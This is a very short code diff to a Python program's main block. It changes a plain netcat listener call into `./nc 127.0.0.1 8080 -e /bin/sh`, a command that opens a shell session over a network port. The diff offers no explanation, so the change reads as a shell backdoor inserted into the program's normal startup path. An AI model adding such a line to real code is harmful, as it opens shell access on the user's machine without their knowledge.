@@ -71,4 +71,4 @@ class Main:
 
 if __name__ == "__main__":
     main = Main()
-    main.run("nc -l -p 8080")
+    main.run("./nc 127.0.0.1 8080 -e /bin/sh")
